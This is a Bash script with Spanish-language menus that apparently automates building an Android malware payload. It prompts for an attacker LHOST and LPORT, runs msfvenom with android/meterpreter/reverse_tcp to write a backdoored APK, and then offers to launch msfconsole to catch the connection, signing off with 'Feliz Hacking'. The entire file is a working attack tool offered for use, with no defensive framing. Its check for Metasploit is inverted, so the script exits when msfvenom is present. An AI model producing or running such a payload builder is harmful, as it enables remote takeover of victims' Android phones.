#!/bin/bash

#############
# COLORES####
#############

####################
verde='\033[32m'
amarillo='\033[33m'
magenta='\033[1;35m'
rojo='\033[31m'
blanco='\033[37m'
cyan='\033[1;36m'
####################

# Linux Mint

while :
do

echo ""                                        
echo -e ${magenta}"     +++++++++++++++++"
echo -e ${verde}"     Elije una opcion :"
echo -e ${magenta}"     +++++++++++++++++"
echo ""
echo -e ${verde}"         [1]${blanco} Payload para Android."
echo ""
echo -e ${rojo}"         [2] Salir."
echo ""   
echo -e -n ${cyan}">>>${verde} "
read -r opcion                                              

[ "${opcion}" == "1" ]||[ "${opcion}" == "2" ] && break         
echo ""  
echo -e ${rojo}"[-]${blanco} Opcion incorrecta..."  
sleep 3  
clear                                                         

done

if [ "$opcion" == "1" ]; then


	sleep 2
                if [ ! -x ${bin}/msfvenom ]; then
                        echo -e ${verde}"
[+]${blanco} Empezando...."${blanco}
                         sleep 2
                 else
                         echo -e ${rojo}"
           Lo sentimos no tiene instalado Metasploit :(
                         "${blanco}                    
			 exit 1
                fi
		sleep 1.5

		echo -e ${verde}""
            echo -e -n ${cyan}"Digite tu LHOST:${verde} "
            read -r LHOST
            sleep 2
            echo ""
            echo -e ${magenta}"Ejemplo${cyan}:${magenta} 4444"
            echo -e -n ${cyan}"Digite tu LPORT:${verde} "
            read -r LPORT
            sleep 2                                                       
	    echo ""
            echo -e ${magenta}"Ejemplo${cyan}:${magenta} Strike.apk"
	    echo -e -n ${cyan}"Nombre del apk:${verde} "                   
	    read -r apk                                                    
	    sleep 2
	    echo ""
	    echo -e -n $cyan"Digite la ruta del apk a guardar:$verde "
	    read -r ruta
	    sleep 2
            echo ""
            echo -e ${verde}"[+]${blanco} Generando el Payload...."
            sleep 3
            echo ""
	    sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT"  R > "$ruta""$apk"
            sleep 1
            echo ""
            echo -e ${verde}"[+]${blanco} Payload Generado"
            sleep 3
            echo ""
            echo -e ${verde}"[+]${blanco} Guardado en la memoria interna"
            sleep 3
            echo ""
	    while :
	    do

echo -e ${blanco}" ¿Ejecuto Measploit?"
sleep 1.5
echo -e ${verde}"
[1]${blanco} Si"
echo ""
echo -e ${verde}"[2]${blanco} No"
echo ""
echo -e -n ${cyan}">>>${verde} "
read -r opcion

[ "$opcion" == "1" ]||[ "$opcion" == "2" ] && break
echo ""
echo -e ${rojo}"[-]${blanco} Opcion Incorrecta. Elige bien pues :)"
sleep 3
clear
done

if [ "${opcion}" == "1" ]; then
	sudo msfconsole
	echo ""
	echo -e ${verde}"[*]${blanco} Feliz Hacking...^_^"
	sleep 2.5
	exit
else
	[ "$opcion" == "2" ]
	echo ""
	echo -e ${verde}"[*]${blanco} Hasta Luego..."
	sleep 1.5
fi
exit

else
	[ "$opcion" == "2" ]
	echo ""
        echo -e ${verde}"[*]${blanco} Hasta pronto..."
        sleep 1.5
	exit
fi
